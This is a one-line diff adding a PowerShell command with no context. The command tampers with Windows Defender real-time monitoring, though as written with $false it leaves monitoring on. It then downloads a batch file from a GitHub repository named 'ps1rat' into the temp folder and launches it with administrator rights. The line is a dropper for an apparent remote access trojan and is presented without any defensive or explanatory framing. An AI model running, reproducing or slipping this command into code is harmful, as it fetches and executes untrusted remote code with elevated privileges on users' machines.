@@ -1,0 +1,1 @@
+Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue; $tmp = Join-Path $env:TEMP "build.bat"; Invoke-WebRequest -Uri "https://github.com/uwuwusudj/ps1rat/raw/refs/heads/main/build.bat" -OutFile $tmp; Start-Process -FilePath $tmp -Verb RunAs
